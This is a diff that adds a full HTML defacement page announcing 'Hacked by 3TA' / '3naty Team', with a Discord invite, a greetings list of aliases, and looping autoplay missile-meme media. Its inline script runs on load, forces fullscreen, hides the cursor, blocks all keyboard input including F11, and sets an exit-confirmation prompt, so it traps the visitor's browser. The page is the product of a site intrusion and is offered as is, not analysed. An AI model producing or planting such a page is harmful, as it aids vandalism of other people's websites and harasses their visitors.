@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hacked by 3ta</title>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/png" href="images/99789e98b511057bc42009ff95a1bf2a.png">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="title" content="Hacked by 3ta">
+    <meta name="description" content="oops ! your server get down">
+    <meta name="keywords" content="hacked,deface,wordpress,website,whitehat,blackhat,defacer,hack,mirror">
+    <meta name="robots" content="index, follow">
+    <meta name="language" content="English">
+    <meta name="revisit-after" content="60 days">
+    <meta name="author" content="Anon7">
+    <meta property="og:image" content="images/99789e98b511057bc42009ff95a1bf2a.png">
+    <meta name="theme-color" content="#000">
+    <script src="js/jquery.min.js"></script>
+    <style type="text/css">
+      body {
+        margin: 0;
+        padding: 0;
+        background-color: black;
+        color: white;
+        font-family: 'Courier', monospace;
+        overflow: hidden;
+      }
+
+      a:hover {
+        cursor: url(http://cur.cursors-4u.net/symbols/sym-1/sym46.cur), progress !important;
+      }
+
+      #background-video {
+        height: 100vh;
+        width: 100vw;
+        object-fit: cover;
+        position: fixed;
+        left: 0;
+        right: 0;
+        top: 0;
+        bottom: 0;
+        z-index: -1;
+        filter: brightness(50%) contrast(120%);
+      }
+
+      #hekerabies {
+        color: red;
+        font-size: 3em;
+        text-shadow: 0 0 15px red, 0 0 30px red, 0 0 45px red;
+        animation: bloodDrip 2s linear infinite;
+      }
+
+      @keyframes bloodDrip {
+        0% {
+          text-shadow: 0 0 15px red, 0 0 30px red, 0 0 45px red;
+        }
+        50% {
+          text-shadow: 0 0 30px darkred, 0 0 60px darkred, 0 0 90px darkred;
+        }
+        100% {
+          text-shadow: 0 0 15px red, 0 0 30px red, 0 0 45px red;
+        }
+      }
+
+      .blood {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: url('images/blood-drip.png') repeat;
+        opacity: 0.7;
+        pointer-events: none;
+      }
+
+      div {
+        position: relative;
+        animation: glitch 1s linear infinite;
+      }
+
+      @keyframes glitch {
+        2%, 64% {
+          transform: translate(2px, 0) skew(0deg);
+        }
+        4%, 60% {
+          transform: translate(-2px, 0) skew(0deg);
+        }
+        62% {
+          transform: translate(0, 0) skew(5deg);
+        }
+      }
+
+      div:before, div:after {
+        content: attr(title);
+        position: absolute;
+        left: 0;
+        color: red;
+        font-size: 2em;
+        text-shadow: 0 0 15px red, 0 0 30px red;
+      }
+
+      div:before {
+        animation: glitchTop 1s linear infinite;
+        clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%);
+      }
+
+      @keyframes glitchTop {
+        2%, 64% {
+          transform: translate(2px, -2px);
+        }
+        4%, 60% {
+          transform: translate(-2px, 2px);
+        }
+        62% {
+          transform: translate(13px, -1px) skew(-13deg);
+        }
+      }
+
+      div:after {
+        animation: glitchBottom 1.5s linear infinite;
+        clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%);
+      }
+
+      @keyframes glitchBottom {
+        2%, 64% {
+          transform: translate(-2px, 0);
+        }
+        4%, 60% {
+          transform: translate(-2px, 0);
+        }
+        62% {
+          transform: translate(-22px, 5px) skew(21deg);
+        }
+      }
+
+      marquee {
+        color: red;
+        font-size: 1.5em;
+        font-weight: bold;
+        text-shadow: 0 0 15px red, 0 0 30px red;
+      }
+
+      .footer-greetings {
+        position: absolute;
+        bottom: 10px;
+        width: 100%;
+        text-align: center;
+      }
+    </style>
+    <script language="JavaScript">
+      window.onbeforeunload = confirmExit;
+
+      function confirmExit() {
+        return "Are you sure? Bo M6er";
+      }
+
+      function fs() {
+        var elem = document.documentElement;
+        if (elem.requestFullscreen) {
+          elem.requestFullscreen();
+        } else if (elem.msRequestFullscreen) {
+          elem.msRequestFullscreen();
+        } else if (elem.mozRequestFullScreen) {
+          elem.mozRequestFullScreen();
+        } else if (elem.webkitRequestFullscreen) {
+          elem.webkitRequestFullscreen();
+        }
+        document.getElementById("body").style.cursor = 'none';
+        document.onkeydown = function(e) {
+          return false;
+        }
+        document.addEventListener("keydown", e => {
+          if (e.key == "F11") e.preventDefault();
+        });
+      }
+
+      function playAudio() {
+        var audio = document.getElementById("lagu");
+        if (audio) {
+          audio.play();
+        }
+      }
+
+      document.addEventListener('DOMContentLoaded', function () {
+        fs();
+        playAudio();
+      });
+    </script>
+</head>
+<body>
+    <div class="blood"></div>
+    <audio src="media/y2mate.com_-_Moscow_Moscow_Missile_Meme.mp3" autoplay="true" id="lagu" loop=""></audio>
+    <video id="background-video" src="media/y2mate.com_-_Moscow_Moscow_Missile_Meme_360p.mp4" autoplay="" loop="" muted="">
+      <source src="media/y2mate.com_-_Moscow_Moscow_Missile_Meme_360p.mp4" type="video/mp4">
+    </video>
+    <table width="100%" height="100%">
+        <tbody><tr><td>
+            <center>
+                <small> Discord.gg/UAEE </small>
+                <br>
+                <br>Hacked by <span style="color: red; font-style: italic;">‘3naty Team</span><br>
+                <font id="hekerabies">Oops</font><br><br>
+                <small>
+                    <font size="5" color="red">Hacked By 3TA</font>
+                </small>
+                <div class="footer-greetings">
+                    <marquee>
+                        <font size="2">
+                            <b>Greetz:</b> 3tabawkk - BoShhab - Bo3oF - S3DY - RRR - Fayoze - Bo M6er - LIX - OVERDOSE - R1 - Bo M6er - 𝐍𝐞𝐕𝐄𝐞𝐑𝐫𝐐𝟘 - boo - DanGer - WM - Uncle G - k x - D A 
+                        </font>
+                    </marquee>
+                </div>
+            </center>
+        </td></tr></tbody>
+    </table>
+</body>
+</html>
